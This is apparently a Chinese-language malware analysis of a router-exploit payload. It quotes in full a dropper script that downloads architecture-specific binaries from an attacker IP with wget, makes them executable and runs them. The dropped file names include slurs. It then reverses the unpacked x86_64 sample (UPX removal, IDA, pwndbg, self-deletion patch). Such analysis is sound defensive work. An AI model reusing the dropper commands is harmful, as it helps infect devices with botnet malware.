# a tenda router sample analysis

## front

起因是无意中捕捉到以下 exp 尝试

![02de7bcc29e256c393181d6a5d837fae](E:\Pictures\markdown\02de7bcc29e256c393181d6a5d837fae.png)

url 解码后得到清晰内容：

![image-20240414205738443](E:\Pictures\markdown\image-20240414205738443.png)

这大概又是什么路由器的 poc 了，没有查找到相关信息，但是可以主动获取载荷样本分析一下，载荷脚本 `tenda.sh` 内容如下：

```shell
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lol http://94.156.8.244/mips; chmod +x lol; ./lol tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O lmao http://94.156.8.244/mpsl; chmod +x lmao; ./lmao tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O faggot http://94.156.8.244/x86_64; chmod +x faggot; ./faggot tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O gay http://94.156.8.244/arm; chmod +x gay; ./gay tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O retard http://94.156.8.244/arm5; chmod +x retard; ./retard tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O nigger http://94.156.8.244/arm6; chmod +x nigger; ./nigger tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O shit http://94.156.8.244/arm7; chmod +x shit; ./shit tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O nigga http://94.156.8.244/i586; chmod +x nigga; ./nigga tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kekw http://94.156.8.244/i686; chmod +x kekw; ./kekw tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O what http://94.156.8.244/powerpc; chmod +x what; ./what tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O kys http://94.156.8.244/sh4; chmod +x kys; ./kys tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O shiteater http://94.156.8.244/m68k; chmod +x shiteater; ./shiteater tplink
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -O blyat http://94.156.8.244/sparc; chmod +x blyat; ./blyat tplink
rm $0
```

尝试小溯了一下这个 `94.156.8.244`，

![image-20240414205921972](E:\Pictures\markdown\image-20240414205921972.png)

目前没有什么有效信息，但是其中针对不同系统的不同 binary 文件倒是可以尝试获取一下，这里就以 `wget -O faggot http://94.156.8.244/x86_64` 为例

## go

基础信息如下：

```bash
$ mkdir /tmp/tmp; cp faggot /tmp/tmp; cd /tmp/tmp
$ file faggot
	faggot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
$ checksec faggot
[*] '/tmp/tmp/faggot'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x100000)
    Packer:   Packed with UPX
```

带了 upx 壳，去壳的方式有很多种，debian 下直接 `sudo apt install upx-ucl` 安装 upx 工具

```bash
$ upx -d faggot
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
[WARNING] bad b_info at 0x8cd0

[WARNING] ... recovery at 0x8ccc

     76408 <-     36316   47.53%   linux/amd64   faggot

Unpacked 1 file.

$ checksec faggot
[*] '/tmp/tmp/faggot'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

砸壳以后再用 ida 去看就有可分析的地方了，首先 shift + f12 查看字符串，拉到最底下找到 `/bin/sh`，溯源到 `sub_40CF54+B3` 位置，该函数反编译后源码 [在此](https://paste.majo.im/uzoreyebar.cpp)，在 0x40D00C 下断，简单看了一下，很多数据都是临时装载，因此必须要上动调

在 pwndbg 里运行了一下，图示为 _start 中 __libc_start_main 常见引导格式，发现在运行到 0x4001A2 的时候就会 segmentation fault 并且自动删除该 elf

![image-20240415201022362](E:\Pictures\markdown\image-20240415201022362.png)

捕捉到输出如下：

![image-20240415203433946](E:\Pictures\markdown\image-20240415203433946.png)

经过对比，确定 `mov rdi, 0x406780` 为 [main](https://paste.majo.im/okapozixun.cpp) 函数地址，第一个函数 [sub_408D5C](https://paste.majo.im/utiqubuzeq.cpp) 进去就是一个 `sys_unlink(*argv)`，也就是说这个 elf 一运行就会自动删除自己，这里在 ida 中将其 nop 掉，右键 patching 导出成 `unpack_faggot_patch`，后续继续分析
